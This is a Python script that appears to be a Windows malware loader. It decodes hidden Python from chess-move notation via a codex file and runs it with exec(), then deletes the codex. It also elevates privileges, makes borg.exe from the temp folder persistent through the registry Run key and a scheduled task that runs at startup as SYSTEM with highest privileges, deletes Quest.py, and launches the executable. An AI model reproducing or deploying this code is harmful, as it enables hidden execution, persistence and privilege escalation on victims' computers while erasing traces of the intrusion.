import os
import subprocess
import time
import traceback
import sys
import tempfile
import winreg  # For working with Windows registry
import ctypes  # For checking admin privileges

# Step 1: Read the chess-to-Python codex mapping from the file
def read_codex_mapping(codex_file):
    chess_to_python = {}
    with open(codex_file, 'r') as file:
        for line in file:
            move, code = line.split(':', 1)  # Split at the first colon
            chess_to_python[move.strip()] = code.strip()  # Store the code exactly as it appears after the colon
    return chess_to_python

# Step 2: Translate the chess moves into Python code and execute it
def translate_and_execute_chess_moves(chess_moves, codex_file):
    # Read the codex mapping from the file
    chess_to_python = read_codex_mapping(codex_file)

    # Translate the chess moves to Python code
    python_code = ""
    for move in chess_moves:
        if move in chess_to_python:
            python_code += chess_to_python[move] + '\n'  # Preserve formatting
        else:
            python_code += f"# Unmapped move: {move}\n"

    print("Translated Python Code:\n", python_code)

    # Execute the Python code
    try:
        exec(python_code)
        print("Script executed successfully.")
    except Exception as e:
        print(f"Execution failed: {e}")
        print(traceback.format_exc())

    time.sleep(10)  # Wait for 10 seconds before deleting the codex file

    # Clean up by deleting the codex file
    try:
        print(f"Deleting {codex_file}...")
        os.remove(codex_file)
        print(f"{codex_file} has been deleted.")
    except Exception as e:
        print(f"Error during cleanup: {e}")
        print(traceback.format_exc())

# Function to check admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Attempt to relaunch the script with elevated privileges."""
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        sys.exit(0)
    except Exception as e:
        print(f"Failed to elevate script: {e}")
        sys.exit(1)

# Function to add the executable to Windows startup and Task Scheduler
def add_to_startup_and_task_scheduler(executable_path, app_name="BorgApp"):
    # Step 1: Elevate permissions if not running as admin
    if not is_admin():
        print("Not running as admin. Elevating permissions...")
        run_as_admin()

    # Step 2: Add to Windows startup via registry
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
            print(f"Successfully added {executable_path} to registry startup.")

        # Verify the registry key value
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
            value, _ = winreg.QueryValueEx(key, app_name)
            print(f"Registry Key Value for {app_name}: {value}")

    except Exception as e:
        print(f"Failed to add {executable_path} to registry startup: {e}")
        print(traceback.format_exc())
        return  # Exit early if registry setup fails

    # Step 3: Add to Task Scheduler using the registry entry for the path to 'borg.exe'
    if value:
        cmd = [
            'schtasks', '/Create', '/F',
            '/SC', 'ONSTART',  # Trigger on system startup
            '/TN', app_name,  # Task name
            '/TR', f'"{value}"',  # Use the path from the registry
            '/RU', 'SYSTEM',  # Run as SYSTEM user to ensure elevated privileges
            '/RL', 'HIGHEST'  # Run with the highest privileges
        ]

        print(f"Running Task Scheduler command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"Successfully added {executable_path} to Task Scheduler.")
        else:
            print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
    else:
        print(f"Failed to retrieve the registry path for {app_name}.")

# Function to run borg.exe and handle Quest.py cleanup
def run_borg_executable():
    # Get the temp directory path for borg.exe
    user_temp_dir = tempfile.gettempdir()
    borg_exe_path = os.path.join(user_temp_dir, 'borg.exe')
    quest_script_path = os.path.join(os.getcwd(), 'binar', 'Quest.py')

    # Validate paths
    if not os.path.isdir(user_temp_dir) or not os.path.isdir(os.path.join(os.getcwd(), 'binar')):
        print("Directory validation failed.")
        print(f"User temp dir: {user_temp_dir}")
        print(f"Current working directory: {os.getcwd()}")
        return

    print(f"\nAttempting to add {borg_exe_path} to startup and Task Scheduler...")

    if os.path.exists(borg_exe_path):
        try:
            add_to_startup_and_task_scheduler(borg_exe_path)
        except Exception as e:
            print(f"Error while adding {borg_exe_path} to startup and Task Scheduler: {e}")
            print(traceback.format_exc())
            return

        # Clean up Quest.py after adding to startup but before executing borg.exe
        try:
            if os.path.exists(quest_script_path):
                print(f"Deleting {quest_script_path} before executing {borg_exe_path}...")
                os.remove(quest_script_path)
                print(f"{quest_script_path} has been deleted.")
            else:
                print(f"{quest_script_path} not found, skipping deletion.")
        except Exception as e:
            print(f"Error during Quest.py cleanup: {e}")
            print(traceback.format_exc())
            return

        # Execute borg.exe after cleanup
        try:
            print(f"\nAttempting to execute {borg_exe_path}...")
            process = subprocess.Popen([borg_exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                print(f"{borg_exe_path} executed successfully.")
                print(stdout.decode('utf-8'))
            else:
                print(f"Execution failed with return code {process.returncode}.")
                print(stderr.decode('utf-8'))
        except Exception as e:
            print(f"Failed to run {borg_exe_path}: {e}")
            print(traceback.format_exc())
    else:
        print(f"Executable {borg_exe_path} not found.")

# Chess moves representing the code
chess_moves = [
    'WP e2e4', 'BP e7e5', 'WN g1f3', 'BN b8c6', 'WB f1b5', 'BP a7a6',
    # Add the full chess moves here
]

# File path of the codex
codex_file = 'binar/codex_mapping.txt'

# Translate and execute the Python code, then remove the codex file
translate_and_execute_chess_moves(chess_moves, codex_file)

# Finally, run borg.exe and delete Quest.py
run_borg_executable()
